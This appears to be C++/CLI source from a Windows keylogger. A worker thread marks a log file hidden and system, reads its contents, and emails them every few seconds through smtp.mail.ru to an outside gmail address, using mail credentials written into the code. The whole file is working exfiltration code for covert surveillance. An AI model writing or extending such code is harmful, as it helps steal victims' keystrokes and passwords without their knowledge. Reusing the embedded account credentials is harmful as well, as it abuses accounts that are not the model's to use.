#include "header.h"

MSG message;

void msgLoop()
{
	while (GetMessage(&message, NULL, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
}

static void SendCompletedCallback(Object^ sender, AsyncCompletedEventArgs^ e)
{
	// Get the unique identifier for this asynchronous 
	// operation.
	String^ token = (String^)e->UserState;
	if (e->Cancelled)
	{
		Console::WriteLine("[{0}] Send canceled.", token);
	}
	if (e->Error != nullptr)
	{
		Console::WriteLine("[{0}] {1}", token,
			e->Error->ToString());
	}
	else
	{
		Console::WriteLine("Message sent.");
	}
	mailSent = true;
}
unsigned _stdcall sendFileFun(void* pArguments)
{
	SmtpClient^ client = gcnew SmtpClient("smtp.mail.ru", 25);
	client->EnableSsl = true;
	client->DeliveryMethod = SmtpDeliveryMethod::Network;
	client->Credentials = gcnew System::Net::NetworkCredential("testforname@mail.ru", "chidori67");
	MailAddress^ from = gcnew MailAddress("testforname@mail.ru",
		"Good" + "Luck",
		System::Text::Encoding::UTF8);
	MailAddress^ to = gcnew MailAddress("kolyabamberg@gmail.com");
	MailMessage^ message = gcnew MailMessage(from, to);
	while (stopThread) {
		SetFileAttributes(LPCWSTR(logName), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
		std::ifstream log(logName, std::ios::app); //opens log file	
		std::string* content = new std::string(std::istreambuf_iterator<char>(log), std::istreambuf_iterator<char>());
		message->Body = gcnew String(content->c_str());
		message->BodyEncoding = System::Text::Encoding::UTF8;
		client->SendCompleted += gcnew	SendCompletedEventHandler(SendCompletedCallback);
		String^ userState = "test message1";
		client->SendAsync(message, userState);
		System::Threading::Thread::Sleep(5000);
		if (mailSent == false)
		{
			client->SendAsyncCancel();
		}
		message->Body = nullptr;
		Thread::Sleep(10000);
	}
	client = nullptr;
	delete message;
	_endthreadex(0);
	return 0;
}